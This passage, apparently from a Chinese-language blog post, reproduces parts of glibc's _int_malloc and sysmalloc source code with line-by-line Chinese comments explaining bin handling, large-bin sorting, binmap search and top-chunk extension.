                set_head (victim, nb | PREV_INUSE |
                                  (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
                // 设置 remainder 的 size 标志位
                set_head (remainder, remainder_size | PREV_INUSE);
                // #define set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))
                // 设置 remainder 的下一个 chunk 的 prev_size 位
                set_foot (remainder, remainder_size);

                // 啥也没干
                check_malloced_chunk (av, victim, nb);
                void *p = chunk2mem (victim);
                alloc_perturb(p, bytes);
                return p;
            }

            /* remove from unsorted list */
            // 将该 chunk 从 unsorted list 移除
            unsorted_chunks (av)-&gt;bk = bck;
            bck-&gt;fd = unsorted_chunks (av);

            /* Take now instead of binning if exact fit */
            // 恰好完全匹配
            if (size == nb) {
                // 设立下一个 chunk 的 prev_inuse 位
                set_inuse_bit_at_offset (victim, size);
                // 设立 non_main_arena 位
                if (av != &amp;main_arena)
                    set_non_main_arena (victim);
#if USE_TCACHE
                    /* Fill cache first, return to user only if cache fills.
                   We may return one of these chunks later.  */
                    // tcache_nb 存在
                    // 对应的 tcache_bin 未满
                    if (tcache_nb
                    &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)
                  {
                    // 把该块 加入 tcache bin 中
                    tcache_put (victim, tc_idx);
                    // 设立返回标志
                    return_cached = 1;
                    continue;
                  }
                    // 不满足 tcache 储存的情况
                    else
                  {
#endif
                // 直接返回
                check_malloced_chunk (av, victim, nb);
                void *p = chunk2mem (victim);
                alloc_perturb(p, bytes);
                return p;
#if USE_TCACHE
                }
#endif
            }

            /* place chunk in bin */

            if (in_smallbin_range (size)) {
                // 拿到 small_bin 的索引
                victim_index = smallbin_index (size);
                // 拿到链表头
                bck = bin_at (av, victim_index);
                // 拿到 第一个元素
                fwd = bck-&gt;fd;
            } else {
                // 拿到 large_bin 的索引
                victim_index = largebin_index (size);
                // 拿到链表头
                bck = bin_at (av, victim_index);
                // 拿到 第一个元素
                fwd = bck-&gt;fd;

                /* maintain large bins in sorted order */
                // large bin 中有空闲 chunk存在
                if (fwd != bck) {
                    /* Or with inuse bit to speed comparisons */
                    //
                    size |= PREV_INUSE;
                    /* if smaller than smallest, bypass loop below */
                    assert(chunk_main_arena (bck-&gt;bk));

                    // large bin中的chunk是按从大到小排列的
                    // bck-&gt;bk 当前链表中最小的
                    if ((unsigned long) (size)
                        &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)) {
                        // fwd = 链表头
                        // bk = 当前链表最小的那个chunk
                        fwd = bck;
                        bck = bck-&gt;bk;
                        // fd_nextsize = 链表中除头外的第一个元素
                        victim-&gt;fd_nextsize = fwd-&gt;fd;
                        // bk_nextsize = 链表中除头外的第一个元素的 bk_nextsize
                        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;
                        // 链表中除头外的第一个元素 的 bk_nextsize = victim
                        // 完成双链表的连接
                        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
                    } else {
                        assert(chunk_main_arena (fwd));

                        // 根据 fd_nextsize 进行遍历，直到找到应该插入的位置
                        while ((unsigned long) size &lt; chunksize_nomask (fwd)) {
                            fwd = fwd-&gt;fd_nextsize;
                            assert(chunk_main_arena (fwd));
                        }
                        //  如果从 large bin 链表中找到了与当前 chunk 大小相同的 chunk
                        //
                        if ((unsigned long) size
                            == (unsigned long) chunksize_nomask (fwd))
                            /* Always insert in the second position.  */
                            fwd = fwd-&gt;fd;
                        // 如果从 large bin 链表中没有找到与当前 chunk 大小相同的 chunk
                        else {
                            // 将 victim 插入其中并带有 size 域
                            victim-&gt;fd_nextsize = fwd;
                            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;
                            fwd-&gt;bk_nextsize = victim;
                            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
                        }
                        // 接入双链表中
                        bck = fwd-&gt;bk;
                    }
                }
                // 相应的 large bin 没有值
                else
                    // 直接插入
                    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;
            }
            // #define mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))

            mark_bin (av, victim_index);
            // 将 victim 移动至 fd 与 bk 的双链表中
            victim-&gt;bk = bck;
            victim-&gt;fd = fwd;
            fwd-&gt;bk = victim;
            bck-&gt;fd = victim;

#if USE_TCACHE
            /* If we&#39;ve processed as many chunks as we&#39;re allowed while
           filling the cache, return one of the cached ones.  */
            ++tcache_unsorted_count;
            // 满足条件
            if (return_cached
            &amp;&amp; mp_.tcache_unsorted_limit &gt; 0
            &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)
          {
            // 返回之前存入的 tcache
            return tcache_get (tc_idx);
          }
#endif

#define MAX_ITERS       10000
            if (++iters &gt;= MAX_ITERS)
                break;
        }

#if USE_TCACHE
        /* If all the small chunks we found ended up cached, return one now.  */
        // 如果上面没有取出
        if (return_cached)
      {
        // 返回之前存入的 tcache
        return tcache_get (tc_idx);
      }
#endif

        /*
           If a large request, scan through the chunks of current bin in
           sorted order to find smallest that fits.  Use the skip list for this.
         */
        // 在 large bin 中查找
        if (!in_smallbin_range (nb)) {
            // 在 arena 找到对应的位置
            bin = bin_at (av, idx);

            /* skip scan if empty or largest chunk is too small */
            // bin 中有值
            // 且该 chunk 的 size 大于 nb
            if ((victim = first (bin)) != bin
                &amp;&amp; (unsigned long) chunksize_nomask (victim)
                   &gt;= (unsigned long) (nb)) {
                // 从最小的那个 chunk 开始
                victim = victim-&gt;bk_nextsize;
                // 从小到大遍历，直到找到一个 size 比请求的 nb 大于或等于的
                while (((unsigned long) (size = chunksize (victim)) &lt;
                        (unsigned long) (nb)))
                    victim = victim-&gt;bk_nextsize;

                /* Avoid removing the first entry for a size so that the skip
                   list does not have to be rerouted.  */
                // 如果 victim 不是 bin 的最后一个 chunk
                // 且 victim 不是 skip list
                if (victim != last (bin)
                    &amp;&amp; chunksize_nomask (victim)
                       == chunksize_nomask (victim-&gt;fd))
                    // 拿到的 victim 是 没有 next_size 域的那个
                    victim = victim-&gt;fd;

                // 切割前准备
                remainder_size = size - nb;
                // 取消链接
                unlink (av, victim, bck, fwd);

                /* Exhaust */
                // 如果切割后的大小不足以作为一个 chunk ，那么就不分割直接将其标志位设为 inuse
                if (remainder_size &lt; MINSIZE)
                {
                    // 设置下一个 chunk 的 prev_inuse 位
                    set_inuse_bit_at_offset (victim, size);
                    if (av != &amp;main_arena)
                        set_non_main_arena (victim);
                }
                /* Split */
                // 切割
                else
                {
                    remainder = chunk_at_offset (victim, nb);
                    /* We cannot assume the unsorted list is empty and therefore
                       have to perform a complete insert here.  */
                    // 将切割后的 chunk 放入 unsorted bin 中
                    // 记录 remainder
                    bck = unsorted_chunks (av);
                    fwd = bck-&gt;fd;
                    if (__glibc_unlikely(fwd-&gt;bk != bck))
                        malloc_printerr(&quot;malloc(): corrupted unsorted chunks&quot;);
                    remainder-&gt;bk = bck;
                    remainder-&gt;fd = fwd;
                    bck-&gt;fd = remainder;
                    fwd-&gt;bk = remainder;
                    if (!in_smallbin_range (remainder_size)) {
                        remainder-&gt;fd_nextsize = NULL;
                        remainder-&gt;bk_nextsize = NULL;
                    }
                    set_head (victim, nb | PREV_INUSE |
                                      (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
                    set_head (remainder, remainder_size | PREV_INUSE);
                    set_foot (remainder, remainder_size);
                }
                check_malloced_chunk (av, victim, nb);
                void *p = chunk2mem (victim);
                alloc_perturb(p, bytes);
                return p;
            }
        }

        /*
           Search for a chunk by scanning bins, starting with next largest
           bin. This search is strictly by best-fit; i.e., the smallest
           (with ties going to approximately the least recently used) chunk
           that fits is selected.

           The bitmap avoids needing to check that most blocks are nonempty.
           The particular case of skipping all bins during warm-up phases
           when no chunks have been returned yet is faster than it might look.
         */
        // 如果通过上面的方式从最合适的 small bin 或 large bin 中都没有分配到需要的 chunk，
        // 则 查看比当前 bin 的 index 大的 small bin 或 large bin 是否有空闲 chunk 可利用来分配所需的 chunk。
        // 获取下一个相邻 bin 的空闲 chunk 链表
        ++idx;
        bin = bin_at (av, idx);
        // binmap 字段是一个 int 数组，ptmalloc 用一个 bit 来标识该 bit 对应的 bin 中是否包含空闲 chunk。
        // Binmap 按 block 管理，每个 block 为一个 int，共 32 个 bit，可以表示 32 个 bin 中是否有空闲 chunk 存在。
        // 使用 binmap 可以加快查找 bin 是否包含空闲 chunk。
        // 这里只查询比所需 chunk 大的 bin 中是否有空闲 chunk 可用。
        block = idx2block (idx);
        map = av-&gt;binmap[block];
        //     Idx2bit()宏将 idx 指定的位设置为 1，其它位清零，
        //     map 表示一个 block(unsigned int) 值，如果bit 大于 map，
        //     意味着比bit对应的bin的size大的bin中无空闲chunk，
        //     如果 map 为 0，该 block 所对应的所有 bins 中都没有空闲 chunk，
        //     于是遍历 binmap 的下一个 block，直到找到一个不为 0 的 block
        //     或者遍历完所有的 block。
        //     退出循环遍历后，设置 bin 指向 block 的第一个 bit 对应的 bin，
        //     并将 bit 置为 1，表示该 block 中 bit 1 对应的 bin，
        //     这个 bin 中如果有空闲 chunk，该 chunk 的大小一定满足要求。
        bit = idx2bit (idx);

        for (;;) {
            //         如果bit 大于 map，意味着比该bit对应的bin的size大的bin中无空闲chunk，如果 map 为 0，
            //      该 block 所对应的所有 bins 中都没有空闲 chunk 。接着在下一个block中寻找
            /* Skip rest of block if there are no more set bits in this block.  */
            if (bit &gt; map || bit == 0) {
                do {
                    if (++block &gt;= BINMAPSIZE) /* out of bins */
                        // 如果block超过了范围，说明比所需chunk大的bin中没有chunk，直接使用top_chunk
                        goto use_top;
                // 如果block为0,这表明block中的所有bit所对应的bin没有空闲chunk
                } while ((map = av-&gt;binmap[block]) == 0);

                bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));
                bit = 1;
            }

            /* Advance to bin with set bit. There must be one. */
            // 在一个block遍历对应的 bin，直到找到一个 bit 不为 0 退出遍历，则该 bit 对于的 bin 中有空闲 chunk 存在。
            while ((bit &amp; map) == 0) {
                bin = next_bin (bin);
                bit &lt;&lt;= 1;
                assert(bit != 0);
            }

            /* Inspect the bin. It is likely to be non-empty */
            // 获取bin尾部的chunk
            victim = last (bin);

            /*  If a false alarm (empty bin), clear the bit. */
            //         如果 victim 与 bin 链表头指针相同，表示该 bin 中没有空闲 chunk，binmap 中的相应位
            //        设置不准确，将 binmap 的相应 bit 位清零，获取当前 bin 下一个 bin，将 bit 移到下一个
            //        bit 位，即乘以 2。
            if (victim == bin) {
                av-&gt;binmap[block] = map &amp;= ~bit; /* Write through */
                bin = next_bin (bin);
                bit &lt;&lt;= 1;
            } else {
                // 当前 bin 中的最后一个 chunk 满足要求，获取该 chunk 的大小，计算切分出所需 chunk
                // 后剩余部分的大小，然后将 victim 从 bin 的链表中取出。
                /*  We know the first chunk in this bin is big enough to use. */
                size = chunksize (victim);
                assert((unsigned long) (size) &gt;= (unsigned long) (nb));

                remainder_size = size - nb;

                /* unlink */
                unlink (av, victim, bck, fwd);

                /* Exhaust */
                //         如果剩余部分的大小小于 MINSIZE，将整个 chunk 分配给应用层，设置 victim 的状态为
                //        inuse，如果当前分配区为非主分配区，设置 victim 的非主分配区标志位。
                if (remainder_size &lt; MINSIZE)
                {
                    set_inuse_bit_at_offset (victim, size);
                    if (av != &amp;main_arena)
                        set_non_main_arena (victim);
                }

                /* Split */
                else
                {
                    // 如果剩余的大小可以作为一个chunk
                    // 获得剩余部分的地址，放入unsorted bin中
                    remainder = chunk_at_offset (victim, nb);

                    /* We cannot assume the unsorted list is empty and therefore
                       have to perform a complete insert here.  */
                    bck = unsorted_chunks (av);
                    fwd = bck-&gt;fd;
                    // 检查unsorted bin 中的链表头部是否合法
                    if (__glibc_unlikely(fwd-&gt;bk != bck))
                        malloc_printerr(&quot;malloc(): corrupted unsorted chunks 2&quot;);
                    remainder-&gt;bk = bck;
                    remainder-&gt;fd = fwd;
                    bck-&gt;fd = remainder;
                    fwd-&gt;bk = remainder;

                    /* advertise as last remainder */
                    if (in_smallbin_range (nb))
                        av-&gt;last_remainder = remainder;
                    if (!in_smallbin_range (remainder_size)) {
                        remainder-&gt;fd_nextsize = NULL;
                        remainder-&gt;bk_nextsize = NULL;
                    }
                    set_head (victim, nb | PREV_INUSE |
                                      (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
                    set_head (remainder, remainder_size | PREV_INUSE);
                    set_foot (remainder, remainder_size);
                }
                check_malloced_chunk (av, victim, nb);
                void *p = chunk2mem (victim);
                alloc_perturb(p, bytes);
                return p;
            }
        }

        use_top:
        /*
           If large enough, split off the chunk bordering the end of memory
           (held in av-&gt;top). Note that this is in accord with the best-fit
           search rule.  In effect, av-&gt;top is treated as larger (and thus
           less well fitting) than any other available chunk since it can
           be extended to be as large as necessary (up to system
           limitations).

           We require that av-&gt;top always exists (i.e., has size &gt;=
           MINSIZE) after initialization, so if it would otherwise be
           exhausted by current request, it is replenished. (The main
           reason for ensuring it exists is that we may need MINSIZE space
           to put in fenceposts in sysmalloc.)
         */
        // 如果从所有的 bins 中都没有获得所需的 chunk，可能的情况为 bins 中没有空闲 chunk，
        // 或者所需的 chunk 大小很大，下一步将尝试从 top chunk 中分配所需 chunk。
        victim = av-&gt;top;
        size = chunksize (victim);

        // 果 top chunk 满足我们要申请的 chunk 大小要求
        if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))
        {
            // 切割 top chunk
            remainder_size = size - nb;
            remainder = chunk_at_offset (victim, nb);
            av-&gt;top = remainder;
            set_head (victim, nb | PREV_INUSE |
                              (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
            set_head (remainder, remainder_size | PREV_INUSE);

            check_malloced_chunk (av, victim, nb);
            void *p = chunk2mem (victim);
            alloc_perturb(p, bytes);
            return p;
        }

        /* When we are using atomic ops to free fast chunks we can get
           here for all block sizes.  */
        // 如果 top chunk 空间不够
        // 且 fastbin 中有空闲 chunk
        else if (atomic_load_relaxed(&amp;av-&gt;have_fastchunks)) {
            // 触发 malloc_consolidate 函数合并 fastbin 的 chunk
            malloc_consolidate(av);
            /* restore original bin index */
            if (in_smallbin_range (nb))
                idx = smallbin_index (nb);
            else
                idx = largebin_index (nb);
        }

            /*
               Otherwise, relay to handle system-dependent cases
             */
        else {
            void *p = sysmalloc(nb, av);
            if (p != NULL)
                alloc_perturb(p, bytes);
            return p;
        }
    }
}
</code></pre>
<h3 id="sysmalloc"><a href="#sysmalloc" class="headerlink" title="sysmalloc"></a>sysmalloc</h3><blockquote>
<p>此部分来自 <a href="https://www.cnblogs.com/luoleqi/p/15520621.html#malloc_consolidatemstate-av">link</a></p>
</blockquote>
<pre><code class="c">/*
   sysmalloc handles malloc cases requiring more memory from the system.
   On entry, it is assumed that av-&gt;top does not have enough
   space to service request for nb bytes, thus requiring that av-&gt;top
   be extended or replaced.
 */
static void *sysmalloc(INTERNAL_SIZE_T nb, mstate av) {
    mchunkptr old_top;              /* incoming value of av-&gt;top */
    INTERNAL_SIZE_T old_size;       /* its size */
    char *old_end;                  /* its end address */

    long size;                      /* arg to first MORECORE or mmap call */
    char *brk;                      /* return value from MORECORE */

    long correction;                /* arg to 2nd MORECORE call */
    char *snd_brk;                  /* 2nd return val */

    INTERNAL_SIZE_T front_misalign; /* unusable bytes at front of new space */
    INTERNAL_SIZE_T end_misalign;   /* partial page left at end of new space */
    char *aligned_brk;              /* aligned offset into brk */

    mchunkptr p;                    /* the allocated/returned chunk */
    mchunkptr remainder;            /* remainder from allocation */
    unsigned long remainder_size;   /* its size */


    size_t pagesize = GLRO(dl_pagesize);
    bool tried_mmap = false;


    /*
       If have mmap, and the request size meets the mmap threshold, and
       the system supports mmap, and there are few enough currently
       allocated mmapped regions, try to directly map this request
       rather than expanding top.
     */
    // 如果没有分配区
    // 或所需分配的 chunk 大小大于 mmap 分配阈值 且 当前进程使用 mmap() 分配的内存块小于设定的最大值
    if (av == NULL
        || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold)
            &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))) {
        char *mm;           /* return value from mmap call*/

        try_mmap:
        /*
           Round up size to nearest page.  For mmapped chunks, the overhead
           is one SIZE_SZ unit larger than for normal chunks, because there
           is no following chunk whose prev_size field could be used.

           See the front_misalign handling below, for glibc there is no
           need for further alignments unless we have have high alignment.
         */
        // 计算满足页对齐的最小分配内存大小
        if (MALLOC_ALIGNMENT == 2 * SIZE_SZ)
            size = ALIGN_UP(nb + SIZE_SZ, pagesize);
        else
            size = ALIGN_UP(nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);
        tried_mmap = true;

        /* Don&#39;t try if size wraps around 0 */
        // 如果重新计算所需分配的 size 大于 nb
        if ((unsigned long) (size) &gt; (unsigned long) (nb)) {
            mm = (char *) (MMAP (0, size, PROT_READ | PROT_WRITE, 0));
            // 如果 mmap()分配内存成功
            // 将 mmap()返回的内存指针强制转换为 chunk 指针
            // 并设置该 chunk 的大小为 size，同时设置该 chunk 的 IS_MMAPPED 标志位
            // 表示本 chunk 是通过 mmap()函数直接从系统分配的
            if (mm != MAP_FAILED) {
                /*
                   The offset to the start of the mmapped region is stored
                   in the prev_size field of the chunk. This allows us to adjust
                   returned start address to meet alignment requirements here
                   and in memalign(), and still be able to compute proper
                   address argument for later munmap in free() and realloc().
                 */
                // 如果 MALLOC_ALIGNMENT 不等于 2 * SIZE_SZ，则分配的内存
                // 可能是不对齐的，按照 MALLOC_ALIGNMENT 具体的值进行对齐
                if (MALLOC_ALIGNMENT == 2 * SIZE_SZ) {
                    /* For glibc, chunk2mem increases the address by 2*SIZE_SZ and
                       MALLOC_ALIGN_MASK is 2*SIZE_SZ-1.  Each mmap&#39;ed area is page
                       aligned and therefore definitely MALLOC_ALIGN_MASK-aligned.  */
                    // 检测是否对齐
                    assert(((INTERNAL_SIZE_T)chunk2mem (mm) &amp; MALLOC_ALIGN_MASK) == 0);
                    front_misalign = 0;
                } else
                    front_misalign = (INTERNAL_SIZE_T)chunk2mem (mm) &amp; MALLOC_ALIGN_MASK;
                if (front_misalign &gt; 0) {
                    correction = MALLOC_ALIGNMENT - front_misalign;
                    p = (mchunkptr) (mm + correction);
                    set_prev_size (p, correction);
                    set_head (p, (size - correction) | IS_MMAPPED);
                } else {
                    p = (mchunkptr) mm;
                    set_prev_size (p, 0);
                    set_head (p, size | IS_MMAPPED);
                }

                /* update statistics */
                // 更新相关统计值，首先将当前进程 mmap 分配内存块的计数加一，如果使用
                // mmap() 分配的内存块数量大于设置的最大值，将最大值设置为最新值，这个
                // 判断不会成功，因为使用mmap分配内存的条件中包括了mp_.n_mmaps &lt; mp_.n_mmaps_max，
                // 所以++mp_.n_mmaps &gt; mp_.max_n_mmaps 不会成立。然后更新 mmap 分配的内存
                // 总量，如果该值大于设置的最大值，将当前值赋值给 mp_.max_mmapped_mem
                int new = atomic_exchange_and_add(&amp;mp_.n_mmaps, 1) + 1;
                atomic_max(&amp;mp_.max_n_mmaps, new);

                unsigned long sum;
                sum = atomic_exchange_and_add(&amp;mp_.mmapped_mem, size) + size;
                atomic_max(&amp;mp_.max_mmapped_mem, sum);

                check_chunk (av, p);
                // 将分配的 chunk 的指针返回，用户存放数据时就是从该指针指向的内存开始存放
                return chunk2mem (p);
            }
        }
    }

    /* There are no usable arenas and mmap also failed.  */
    if (av == NULL)
        return 0;

    /* Record incoming configuration of top */
    // 保存当前 top chunk 的指针，大小和结束地址到临时变量中
    old_top = av-&gt;top;
    old_size = chunksize (old_top);
    old_end = (char *) (chunk_at_offset (old_top, old_size));

    brk = snd_brk = (char *) (MORECORE_FAILURE);

    /*
       If not the first time through, we require old_size to be
       at least MINSIZE and to have prev_inuse set.
     */
    // 检查 top chunk 的合法性，如果第一次调用本函数，top chunk 可能没有初始化，
    // 可能 old_size 为 0，如果 top chunk 已经初始化，则 top chunk 的大小必须
    // 大于等于 MINSIZE，因为 top chunk 中包含了 fencepost，fencepost 需要 MINSIZE
    // 大小的内存。Top chunk 必须标识前一个 chunk 处于 inuse 状态，这是规定，并且
    // top chunk 的结束地址必定是页对齐的。另外 top chunk 的除去 fencepost 的大小
    // 必定小于所需 chunk 的大小，不然在_int_malloc()函数中就应该使用 top chunk 获得所需的 chunk
    assert((old_top == initial_top (av) &amp;&amp; old_size == 0) ||
    ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;
    prev_inuse (old_top) &amp;&amp;
    ((unsigned long) old_end &amp; (pagesize - 1)) == 0));

    /* Precondition: not enough current space to satisfy nb request */
    assert((unsigned long) (old_size) &lt; (unsigned long) (nb + MINSIZE));

    // 如果当前分配区为非主分配区
    if (av != &amp;main_arena) {
        heap_info *old_heap, *heap;
        size_t old_heap_size;

        /* First try to extend the current heap. */
        old_heap = heap_for_ptr (old_top);
        old_heap_size = old_heap-&gt;size;
        // 根据 top chunk 的指针获得当前 sub_heap 的 heap_info 实例，
        // 如果 top chunk 的剩余有效空间不足以分配出所需的 chunk（前
        // 面已经断言，这个肯定成立），尝试增长 sub_heap 的可读可写区
        // 域大小，如果成功，修改过内存分配的统计信息，并更新新的 top chunk 的 size
        if ((long) (MINSIZE +nb - old_size) &gt; 0
                                              &amp;&amp; grow_heap(old_heap, MINSIZE +nb - old_size) == 0)
        {
            av-&gt;system_mem += old_heap-&gt;size - old_heap_size;
            set_head (old_top, (((char *) old_heap + old_heap-&gt;size) - (char *) old_top)
                               | PREV_INUSE);
        }
        // 调用 new_heap()函数创建一个新的 sub_heap，由于这个 sub_heap 中至少
        // 需要容下大小为 nb 的 chunk，大小为 MINSIZE 的 fencepost 和大小为 sizeof(*heap)
        // 的 heap_info 实例，所以传入 new_heap()函数的分配大小为 nb + (MINSIZE + sizeof(*heap))
        else if ((heap = new_heap(nb + (MINSIZE +sizeof(*heap)), mp_.top_pad)))
        {
            /* Use a newly allocated heap.  */
            // 使新创建的 sub_heap 保存当前的分配区指针，将该 sub_heap 加入当前分配区的
            // sub_heap 链表中，更新当前分配区内存分配统计，将新创建的 sub_heap 仅有的一
            // 个空闲chunk 作为当前分配区的 top chunk，并设置 top chunk 的状态
            heap-&gt;ar_ptr = av;
            heap-&gt;prev = old_heap;
            av-&gt;system_mem += heap-&gt;size;
            /* Set up the new top.  */
            top (av) = chunk_at_offset (heap, sizeof(*heap));
            set_head (top(av), (heap-&gt;size - sizeof(*heap)) | PREV_INUSE);

            /* Setup fencepost and free the old top chunk with a multiple of
               MALLOC_ALIGNMENT in size. */
            /* The fencepost takes at least MINSIZE bytes, because it might
               become the top chunk again later.  Note that a footer is set
               up, too, although the chunk is marked in use. */
            old_size = (old_size - MINSIZE) &amp;~MALLOC_ALIGN_MASK;
            set_head (chunk_at_offset(old_top, old_size + 2 * SIZE_SZ), 0 | PREV_INUSE);
            // 设置原 top chunk 的 fencepost，fencepost 需要 MINSIZE 大小的内存空间，将该 old_size
            // 减去 MINSIZE 得到原 top chunk 的有效内存空间，首先设置 fencepost 的第二个 chunk 的 size
            // 为 0，并标识前一个 chunk 处于 inuse 状态。接着判断原 top chunk 的有效内存空间上是否大
            // 于等于 MINSIZE，如果是，表示原 top chunk 可以分配出大于等于 MINSIZE 大小的 chunk，于
            // 是将原 top chunk 切分成空闲 chunk 和 fencepost 两部分，先设置 fencepost 的第一个 chunk
            // 的大小为 2*SIZE_SZ，并标识前一个 chunk 处于 inuse 状态，fencepost 的第一个 chunk 还需
            // 要设置 foot，表示该 chunk 处于空闲状态，而 fencepost 的第二个 chunk 却标识第一个 chunk
            // 处于 inuse 状态，因为不能有两个空闲 chunk 相邻，才会出现这么奇怪的 fencepost。另外其
            // 实 top chunk 切分出来的 chunk 也是处于空闲状态，但 fencepost 的第一个 chunk 却标识前一
            // 个 chunk 为 inuse 状态，然后强制将该处于 inuse 状态的 chunk 调用_int_free()函数释放掉
            // 这样做完全是要遵循不能有两个空闲 chunk 相邻的约定
            if (old_size &gt;= MINSIZE)
            {
                set_head (chunk_at_offset(old_top, old_size), (2 * SIZE_SZ) | PREV_INUSE);
                set_foot (chunk_at_offset(old_top, old_size), (2 * SIZE_SZ));
                set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);
                _int_free(av, old_top, 1);
            }
            // 如果原 top chunk 中有效空间不足 MINSIZE，则将整个原 top chunk 作为 fencepost，
            // 并设置 fencepost 的第一个 chunk 的相关状态
            else
            {
                set_head (old_top, (old_size + 2 * SIZE_SZ) | PREV_INUSE);
                set_foot (old_top, (old_size + 2 * SIZE_SZ));
            }
        }
        // 如果增长 sub_heap 的可读可写区域大小和创建新 sub_heap 都失败了，
        // 尝试使用 mmap() 函数直接从系统分配所需 chunk
        else if (!tried_mmap)
            /* We can at least try to use to mmap memory.  */
            goto try_mmap;
    } else     /* av == main_arena */
    // 如果当前分配区为主分配区

    { /* Request enough space for nb + pad + overhead */
        size = nb + mp_.top_pad + MINSIZE;

        /*
           If contiguous, we can subtract out existing space that we hope to
           combine with new space. We add it back later only if
           we don&#39;t actually get contiguous space.
         */
        // 一般情况下，主分配区使用 sbrk()从 heap 中分配内存，sbrk()返回连续的虚拟内存，
        // 这里调整需要分配的 size，减掉 top chunk 中已有空闲内存大小
        if (contiguous (av))
            size -= old_size;

        /*
           Round to a multiple of page size.
           If MORECORE is not contiguous, this ensures that we only call it
           with whole-page arguments.  And if MORECORE is contiguous and
           this is not first time through, this preserves page-alignment of
           previous calls. Otherwise, we correct to page-align below.
         */
        //  将 size 按照页对齐，sbrk()必须以页为单位分配连续虚拟内存
        size = ALIGN_UP(size, pagesize);

        /*
           Don&#39;t try to call MORECORE if argument is so big as to appear
           negative. Note that since mmap takes size_t arg, it may succeed
           below even if we cannot call MORECORE.
         */
        // 使用 sbrk()从 heap 中分配 size 大小的虚拟内存块
        if (size &gt; 0) {
            brk = (char *) (MORECORE(size));
            LIBC_PROBE(memory_sbrk_more, 2, brk, size);
        }
        // 如果 sbrk()分配成功，并且 morecore 的 hook 函数存在，调用 morecore 的 hook 函数
        if (brk != (char *) (MORECORE_FAILURE)) {
            /* Call the `morecore&#39; hook if necessary.  */
            void (*hook)(void) = atomic_forced_read(__after_morecore_hook);
            if (__builtin_expect(hook != NULL, 0))
                (*hook)();
        } else {
            /*
               If have mmap, try using it as a backup when MORECORE fails or
               cannot be used. This is worth doing on systems that have &quot;holes&quot; in
               address space, so sbrk cannot extend to give contiguous space, but
               space is available elsewhere.  Note that we ignore mmap max count
               and threshold limits, since the space will not be used as a
               segregated mmap region.
             */
            // 如果 sbrk()返回失败，或是 sbrk()不可用，使用 mmap()代替，重新计算所需分配的内存
            // 大小并按页对齐，如果重新计算的 size 小于 1M，将 size 设为 1M，也就是说使用 mmap()
            // 作为 morecore 函数分配的最小内存块大小为 1M
            /* Cannot merge with old top, so add its size back in */
            if (contiguous (av))
                size = ALIGN_UP(size + old_size, pagesize);

            /* If we are relying on mmap as backup, then use larger units */
            if ((unsigned long) (size) &lt; (unsigned long) (MMAP_AS_MORECORE_SIZE))
                size = MMAP_AS_MORECORE_SIZE;

            /* Don&#39;t try if size wraps around 0 */
            // 如果所需分配的内存大小合法，使用 mmap()函数分配内存。如果分配成功，更新 brk
            // 和 snd_brk，并将当前分配区属性设置为可分配不连续虚拟内存块
              if ((unsigned long) (size) &gt; (unsigned long) (nb)) {
                  char *mbrk = (char *) (MMAP (0, size, PROT_READ | PROT_WRITE, 0));

                  if (mbrk != MAP_FAILED) {
                      /* We do not need, and cannot use, another sbrk call to find end */
                    brk = mbrk;
                    snd_brk = brk + size;

                    /*
                       Record that we no longer have a contiguous sbrk region.
                       After the first time mmap is used as backup, we do not
                       ever rely on contiguous space since this could incorrectly
                       bridge regions.
                     */
                    set_noncontiguous (av);
                }
            }
        }
        //如果brk合法，即sbrk()或mmap()分配成功，如果sbrk_base还没有初始化，
        //更新 sbrk_base 和当前分配区的内存分配总量
        if (brk != (char *) (MORECORE_FAILURE)) {
            if (mp_.sbrk_base == 0)
                mp_.sbrk_base = brk;
            av-&gt;system_mem += size;

            /*
               If MORECORE extends previous space, we can likewise extend top size.
             */
            // 如果 sbrk()分配成功，更新 top chunk 的大小，并设定 top chunk 的前一个 chunk 处于 inuse
            // 状态。如果当前分配区可分配连续虚拟内存，原 top chunk 的大小大于 0，但新的 brk 值小
            // 于原 top chunk 的结束地址，则出错了
            if (brk == old_end &amp;&amp; snd_brk == (char *) (MORECORE_FAILURE))
                set_head (old_top, (size + old_size) | PREV_INUSE);

            else if (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end)
                /* Oops!  Someone else killed our space..  Can&#39;t touch anything.  */
                malloc_printerr(&quot;break adjusted to free malloc space&quot;);

                /*
                   Otherwise, make adjustments:

                 * If the first time through or noncontiguous, we need to call sbrk
                    just to find out where the end of memory lies.

                 * We need to ensure that all returned chunks from malloc will meet
                    MALLOC_ALIGNMENT

                 * If there was an intervening foreign sbrk, we need to adjust sbrk
                    request size to account for fact that we will not be able to
                    combine new space with existing space in old_top.

                 * Almost all systems internally allocate whole pages at a time, in
                    which case we might as well use the whole last page of request.
                    So we allocate enough more memory to hit a page boundary now,
                    which in turn causes future contiguous calls to page-align.
                 */
            // 执行到这个分支，意味着 sbrk()返回的 brk 值大于原 top chunk 的结束地址，
            // 那么新的地址与原 top chunk 的地址不连续，可能是由于外部其它地方调用 sbrk()函数，
            // 这里需要处理地址的重新对齐问题
            else {

                front_misalign = 0;
                end_misalign = 0;
                correction = 0;
                aligned_brk = brk;

                /* handle contiguous cases */
                if (contiguous (av)) {
                    /* Count foreign sbrk as system_mem.  */
                    // 如果本分配区可分配连续虚拟内存，并且有外部调用了 sbrk()函数，
